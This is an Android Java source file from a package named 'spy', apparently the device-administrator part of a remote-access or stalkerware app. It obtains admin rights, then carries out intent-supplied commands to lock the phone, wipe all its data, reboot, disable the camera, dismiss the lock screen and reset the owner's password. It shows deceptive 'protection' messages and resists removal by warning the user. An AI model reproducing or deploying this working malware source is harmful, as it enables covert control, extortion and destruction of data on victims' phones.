package alma.pro.spy;
import android.app.Activity;
import android.app.KeyguardManager;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.StringRes;
import android.view.WindowManager;
import android.widget.Toast;

import java.util.Iterator;
import java.util.List;

public class Admin extends Activity {
    static final int ACTIVATION_REQUEST = 47;
    static final int CMD = 1994;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_admin);
        b:{
            try{
                if(getIntent().getStringExtra("R")!=null && !getIntent().getStringExtra("R").equals(" ")){
                    DevicePolicyManager m = (DevicePolicyManager)getSystemService(Context.DEVICE_POLICY_SERVICE);
                    ComponentName d = new ComponentName(this, DeviceAdmin.class);
                    if(m != null && m.isAdminActive(d)) {
                        Intent i = getIntent();
                        try{
                            if(i.getStringExtra("cmd").equals("unlock")){
                                getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
                                break b;
                            }
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                        i.putExtra("R"," ");
                        startActivityForResult(i,CMD);
                    }else{
                        Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, d);
                        i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_description));
                        i.putExtra("cmd",getIntent().getStringExtra("cmd"));
                        i.putExtra("R"," ");
                        startActivityForResult(i, ACTIVATION_REQUEST);
                    }
                }else if(getIntent().getStringExtra("R")!=null && getIntent().getStringExtra("R").equals(" ")){
                    setResult(Activity.RESULT_OK,getIntent());
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        finish();
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        try{
            switch (requestCode) {
                case ACTIVATION_REQUEST:
                    if (resultCode == Activity.RESULT_OK){
                        String cmd = getIntent().getStringExtra("cmd");
                        Intent intent = new Intent(this,Admin.class);
                        intent.putExtra("cmd",cmd);
                        startActivityForResult(intent, CMD);
                    }
                    break;
                case CMD:
                    DevicePolicyManager m = (DevicePolicyManager)getSystemService(Context.DEVICE_POLICY_SERVICE);
                    String cmd = getIntent().getStringExtra("cmd");
                    switch (cmd.toLowerCase()){
                        case "lock":
                            if(Secure(getApplicationContext())) m.lockNow();
                            else m.lockNow();
                            break;
                        case "wipe":
                            m.wipeData(0);
                            break;
                        case "reboot":
                            m.reboot(getActiveComponentName());
                            break;
                    }
                    if(cmd.toLowerCase().startsWith("camera ")){
                        String dis = cmd.substring(7);
                        switch (dis.toLowerCase()){
                            case "0":
                            case "d":
                                m.setCameraDisabled(getActiveComponentName(),true);
                                break;
                            case "1":
                            case "e":
                                m.setCameraDisabled(getActiveComponentName(),false);
                                break;
                        }
                    }else if(cmd.toLowerCase().startsWith("password ")){
                        String np = cmd.substring(9);
                        m.setPasswordQuality(getActiveComponentName(),DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
                        m.setPasswordMinimumLength(getActiveComponentName(), np.length());
                        m.resetPassword(np,DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                    }
                    break;
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        super.onActivityResult(requestCode, resultCode, data);
        finish();
    }
    private ComponentName getActiveComponentName() {
        DevicePolicyManager m = (DevicePolicyManager)getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName componentName = null;
        List<ComponentName> activeComponentList = m.getActiveAdmins();
        for (ComponentName anActiveComponentList : activeComponentList) {
            componentName = anActiveComponentList;
        }
        return componentName;
    }
    public static boolean Secure(Context context) {return isPatternSet(context) || isPassOrPinSet(context);}
    private static boolean isPatternSet(Context context) {
        ContentResolver cr = context.getContentResolver();
        try {
            int lockPatternEnable = Settings.Secure.getInt(cr, Settings.Secure.LOCK_PATTERN_ENABLED);
            return lockPatternEnable == 1;
        } catch (Settings.SettingNotFoundException e) {return false;}
    }
    private static boolean isPassOrPinSet(Context context) {
        KeyguardManager keyguardManager = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE); //api 16+
        return keyguardManager.isKeyguardSecure();
    }
    public static class DeviceAdmin extends DeviceAdminReceiver{
        public DeviceAdmin(){}
        void showToast(Context context, String msg) {
            Toast.makeText(context, msg, Toast.LENGTH_SHORT).show();
        }
        @Override
        public void onEnabled(Context context, Intent intent) {
            showToast(context, "Device Administrator: Protection enabled");
            super.onEnabled(context, intent);
        }
        @Override
        public CharSequence onDisableRequested(Context context, Intent intent) {
            super.onDisableRequested(context, intent);
            return "Error: Device Administrator is required!";
        }
        @Override
        public void onDisabled(Context context, Intent intent) {
            super.onDisabled(context, intent);
            showToast(context, "Error: Device Administrator has been disabled! Your device is no longer protected");
        }
        @Override
        public void onPasswordChanged(Context context, Intent intent) {
            super.onPasswordChanged(context,intent);
        }

    }
}
